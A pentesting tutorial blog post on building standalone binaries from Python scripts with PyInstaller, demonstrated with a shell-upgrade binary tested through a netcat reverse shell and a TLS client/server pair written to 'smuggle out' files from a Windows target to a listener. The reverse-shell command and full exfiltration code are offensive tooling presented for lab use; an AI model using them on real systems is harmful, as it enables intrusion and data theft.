---
title: "Tutorial: Create Binary Versions of Python Tools"
date: 2020-11-07T15:34:30-04:00
categories:
  - tutorial
tags:
  - python
  - pentesting
  - tools
  - linux
  - windows
---

With **PyInstaller** you can create stand-alone binaries that run on machines that do not have Python installed.

On Linux it will create an executable ELF binary.  
On Windows it creates a PE32 or PE32+ exe.  

This created binary will include the python interpreter, so the minimum file size for a 64bit ELF binary is around 4 MB and the Windows equivalent is around 6 MB.  
So yeah, the file size is noticeably big, especially if you just wanted to run a small script.

## Cross-Compiling

Here comes the bad news, there is no cross-compiling build-in.  
If you want to create Windows binaries, then you will have to do so on Windows and the same is true for Linux.  

Also please note that it **does** matter whether you use the 32bit or 64bit version of the Python interpreter. Using the 64bit Linux interpreter results in a 64bit ELF binary.

But I assume you have some VM's lying around that can be used.  
[Wine might also work](https://stackoverflow.com/a/35605479), but I have not tried that.


## Install

On linux you can just use `pip3 install PyInstaller` or `pip install PyInstaller` for the 2.7 version.

On Windows you can also use `python.exe -m pip install PyInstaller`.

I will use the 3+ version of Python for the following examples. But the process should be the same regardless of what version you use. Just make sure the Interpreter you use for compiling the binary is the same one the script would use.


## Example: Upgrade a Linux Reverse Shell

If you have done some HackTheBox, then you have probably encountered this python snippet before: 

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This spawns a fully interactive pseudo-terminal that allows you to run commands such as `su` or `sudo`, which can be pretty handy if you are stuck with a semi-interactive reverse shell.

There are other ways to spawn a fully-interactive shell besides python, but this will do as a simple example.

Let's create a standalone-binary version of this snippet.

First create a python script file `upgrade.py`:
```python
#!/usr/bin/env python3
import pty
pty.spawn("/bin/bash")
```

Use the following command in order to create a pyinstaller binary:

```bash
pyinstaller --onefile upgrade.py
```

The `--onefile` parameter tells pyinstaller that all libraries should be packed into the binary.

If this finishes successfully, then you will find the created binary in the /dist subfolder.

### Does It Work?

Make sure the created `upgrade` binary is executable (`chmod +x upgrade`).

Listen for a shell with netcat:

```bash
nc -vlnp 4455
```

We will simulate a reverse shell as user www-data using sudo.  
This of course assumes you have such a user on your system and the required sudo permissions.  

Do this in a second shell:
```bash
sudo -u www-data bash -c "/usr/bin/nc localhost 4455 -e /bin/bash"
```

In the first terminal you will receive the semi-interactive netcat reverse shell (added new lines for clarity):

```bash
$ nc -vlnp 4455
listening on [any] 4455 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33470

whoami
www-data

tty
not a tty

ls -l
total 4000
-rwxr-xr-x 1 kali kali 4092904 Jan 15 19:42 upgrade
```

Run our binary:

```bash
./upgrade
www-data@kali:/tmp/upgrade/dist$ tty
tty
/dev/pts/2
www-data@kali:/tmp/upgrade/dist$ 
www-data@kali:/tmp/upgrade/dist$ su kali
su kali
Password: hunter2

kali@kali:/tmp/upgrade/dist$
```

The `tty` command confirms our upgraded shell counts as a terminal. You should be able to execute interactive commands like `su` now.


## Example: File Upload On Windows

Here is an example for Windows. The process is pretty much the same.

Let us smuggle out some files from a Windows machine using a TLS encrypted connection.

This is the server we will use to receive the file (does not need to be compiled).  
Save it as `receiver.py`:

```python
#!/usr/bin/env python3
# -TLS Reverse Connect File Receiver-
# U+0A75
# Create cert and key:
# openssl req -new -newkey rsa:4096 -days 730 -nodes -x509 -keyout server.key -out server.cert
import socket, sys, ssl

if (len(sys.argv) < 2):
    print("params: <listen_port> <output_filename>")
    sys.exit(0)

PORT = int(sys.argv[1])
FILENAME = sys.argv[2]
CERT = "server.cert"
KEY = "server.key"
HOST = "0.0.0.0"
TIMEOUT = 20 # seconds

context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile=CERT, keyfile=KEY)
context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 
context.set_ciphers('EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH')
listener = socket.socket()
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((HOST, PORT))
listener.listen(0) # no backlog
print("Listening...")

incoming_socket, incoming_addr = listener.accept()
connection = context.wrap_socket(incoming_socket, server_side=True)
connection.settimeout(TIMEOUT)
print("Accepted:", incoming_addr)

f = open (FILENAME, "wb")
print("Receiving...")
received = connection.recv(1024)
while received:
    f.write(received)
    received = connection.recv(1024)
connection.close()
listener.close()
f.close()
print("Done")
```

Create a certificate and secret key for the server with:

```bash
openssl req -new -newkey rsa:4096 -days 730 -nodes -x509 -keyout server.key -out server.cert
```

Enter whatever you want to the prompts. 
Make sure the created files are in the same directory as the `receiver.py` python script.

Now comes the uploader we will compile for Windows. Save it as `uploader.py`:

```python
#!/usr/bin/env python3
import socket, sys, ssl

if (len(sys.argv) < 3):
    print("params: <ip> <port> <filename>")
    sys.exit(0)

HOST = sys.argv[1]
PORT = int(sys.argv[2])
FILENAME = sys.argv[3]

context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
context.check_hostname = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tls_sock = context.wrap_socket(sock)
tls_sock.connect((HOST, PORT))
print("Connected")
print("Sending...")
f = open (FILENAME, "rb")
l = f.read(1024)
while (l):
    tls_sock.send(l)
    l = f.read(1024)
tls_sock.close() 
print("Done")
```

Now on windows compile `uploader.py`.

```powershell
python.exe -m PyInstaller --onefile uploader.py
```

Once again you will find the created exe in the dist subfolder.

Listen for a connection on your Linux machine with the receiver.py

```bash
python3 receiver.py 5566 received_file.jpg
```
      
Then on the target machine execute the `upload` binary with the IP address of your linux machine

```powershell
.\upload.exe 10.1.1.42 5566 some_file.jpg
```

You should receive the original JPEG file.  
You can confirm the two files are the same using md5sum.

On Windows use: `certUtil -hashfile some_file.jpg MD5`  
On Linux use: `md5sum some_file.jpg`

For example, the md5 sum of [this image](https://upload.wikimedia.org/wikipedia/commons/f/fa/Agra%2C_Taj_Mahal_LCCN95505064.jpg) of the Taj Mahal is:  
`a6c706bab2af1f107fda6998dbc46a02`